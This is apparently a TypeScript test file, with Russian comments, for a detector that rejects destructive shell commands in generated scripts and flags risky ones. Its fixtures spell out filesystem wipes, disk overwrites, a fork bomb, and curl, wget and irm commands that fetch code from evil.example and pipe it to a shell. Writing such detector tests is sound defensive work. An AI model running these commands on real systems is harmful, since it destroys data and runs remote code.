import { describe, expect, it } from 'vitest'
import { findDestructive, findDestructiveSteps, findRisky, stepDanger } from '@/core/domain/destructive-command'

/**
 * Золотой набор. Слева — то, что обязано быть отклонено на записи: список отдаётся
 * как исполняемый скрипт, и до этой проверки его не спрашивал никто (sanitizeCommand
 * проверяет правдоподобие, модерация — контент, планка готовности — полезность).
 *
 * Справа — обычные команды, которые обязаны проходить. Ложное срабатывание здесь
 * дороже пропуска: автор, у которого отклонили честный `rm -rf ./build`, второй раз
 * проверку не позовёт.
 */
const DESTRUCTIVE: [string, string][] = [
  // Продолжение строки: по отдельности строки безобидны, но bash их склеит.
  ['rm -rf \
  /', 'wipesFilesystem'],
  ['curl -s http://evil.example/i.sh \
  | sh', 'runsRemoteCode'],
  // Исполнители: содержимое кавычек здесь и есть исполняемая часть.
  ['bash -c "rm -rf /"', 'wipesFilesystem'],
  ['rm -rf /', 'wipesFilesystem'],
  ['sudo rm -rf / --no-preserve-root', 'wipesFilesystem'],
  ['rm -fr ~', 'wipesFilesystem'],
  ['rm -rf $HOME', 'wipesFilesystem'],
  ['dd if=/dev/zero of=/dev/sda bs=1M', 'overwritesDisk'],
  ['cat /dev/urandom > /dev/nvme0n1', 'overwritesDisk'],
  ['mkfs.ext4 /dev/sdb1', 'formatsDisk'],
  [':(){ :|:& };:', 'forkBomb'],
  ['curl -s http://evil.example/i.sh | sh', 'runsRemoteCode'],
  ['wget -qO- https://evil.example/x | sudo bash', 'runsRemoteCode'],
  ['irm https://evil.example/p.ps1 | iex', 'runsRemoteCode'],
  ['chmod -R 777 /etc', 'breaksPermissions'],
  ['shutdown -h now', 'haltsMachine'],
]

const SAFE = [
  // Инструкция вправе ПОКАЗАТЬ опасную команду как пример — это не исполнение.
  'echo "curl https://example.test/install | sh"',
  'printf "never run rm -rf / on production"',
  'npm ci # не путать с rm -rf /',
  'npm ci && npm run build',
  'docker compose up -d',
  'rm -rf ./build',
  'rm -rf node_modules/.cache',
  'git clone https://github.com/acme/repo.git && cd repo',
  'curl -fsSL https://api.example.com/health',
  'chmod +x ./scripts/deploy.sh',
  'chmod 644 ./config.yml',
  'dd if=backup.img of=./restore.img',
  'kubectl rollout restart deployment/api',
  'psql -c "select 1"',
  'echo "shutdown" >> notes.txt',
]

describe('разрушительные команды не попадают в исполняемый список', () => {
  for (const [cmd, reason] of DESTRUCTIVE) {
    it(`отклоняет: ${cmd}`, () => {
      const m = findDestructive(cmd)
      expect(m).not.toBeNull()
      expect(m?.reason).toBe(reason)
    })
  }

  for (const cmd of SAFE) {
    it(`пропускает обычную команду: ${cmd}`, () => {
      expect(findDestructive(cmd)).toBeNull()
    })
  }

  it('проверяет каждую строку: опасное может стоять не первым', () => {
    const m = findDestructive('cd /tmp\nls -la\nrm -rf /')
    expect(m?.reason).toBe('wipesFilesystem')
  })

  it('закомментированная строка не считается командой', () => {
    expect(findDestructive('# rm -rf / — так делать нельзя\nnpm ci')).toBeNull()
  })

  it('находит номера шагов для отказа на записи', () => {
    const found = findDestructiveSteps([{ command: 'npm ci' }, { command: '' }, { command: 'mkfs.ext4 /dev/sdb1' }])
    expect(found).toHaveLength(1)
    expect(found[0].index).toBe(2)
    expect(found[0].match.reason).toBe('formatsDisk')
  })
})

/**
 * ВТОРОЙ УРОВЕНЬ: «законно, но необратимо». Эти команды публиковать МОЖНО (в
 * справочнике по эксплуатации им место), но исполнять из собранного скрипта — нет.
 * Слева — то, что обязано приезжать закомментированным, справа — рабочая рутина,
 * которую пометка трогать не должна.
 */
const RISKY: [string, string][] = [
  ['docker system prune -a --volumes', 'prunesVolumes'],
  ['docker volume rm app_pgdata', 'prunesVolumes'],
  ['docker compose down -v', 'prunesVolumes'],
  ['rm -rf ./node_modules', 'deletesRecursively'],
  ['Remove-Item -Recurse -Force .\\dist', 'deletesRecursively'],
  ['psql -c "drop table sessions"', 'dropsData'],
  ['psql -c "delete from jobs"', 'dropsData'],
  ['truncate table events', 'dropsData'],
  ['terraform destroy -auto-approve', 'resetsEnvironment'],
  ['kubectl delete pod api-0', 'resetsEnvironment'],
  ['helm uninstall api', 'resetsEnvironment'],
  ['npx prisma migrate reset', 'resetsEnvironment'],
  ['git clean -xfd', 'discardsWork'],
  ['git reset --hard origin/main', 'discardsWork'],
  ['git push --force origin main', 'discardsWork'],
]

const ROUTINE = [
  'docker compose up -d',
  'docker ps -a',
  'docker image prune', // без --volumes/-a: чистит только висячие слои
  'psql -c "delete from jobs where status = \'done\'"', // с WHERE — обычная уборка
  'psql -c "select count(*) from events"',
  'kubectl get pods',
  'kubectl apply -f deploy.yml',
  'git clean -n', // сухой прогон
  'git push --force-with-lease origin feature', // безопасная форма
  'npm ci && npm run build',
  'terraform plan',
]

describe('разрушительные, но законные команды — пометка, а не запрет', () => {
  for (const [cmd, reason] of RISKY) {
    it(`помечает: ${cmd}`, () => {
      expect(findRisky(cmd)?.reason).toBe(reason)
      // И при этом публиковать её МОЖНО — иначе справочник по эксплуатации не написать.
      expect(findDestructive(cmd)).toBeNull()
    })
  }

  for (const cmd of ROUTINE) {
    it(`не трогает рутину: ${cmd}`, () => {
      expect(findRisky(cmd)).toBeNull()
    })
  }

  it('пометка автора сильнее молчания детектора', () => {
    expect(stepDanger({ command: './cleanup.sh' })).toBeNull()
    expect(stepDanger({ danger: true, command: './cleanup.sh' })).toBe('danger')
  })

  it('снятая пометка НЕ отменяет шаблон: команда всё равно разрушительна', () => {
    expect(stepDanger({ danger: false, command: 'docker system prune -a --volumes' })).toBe('prunesVolumes')
  })
})
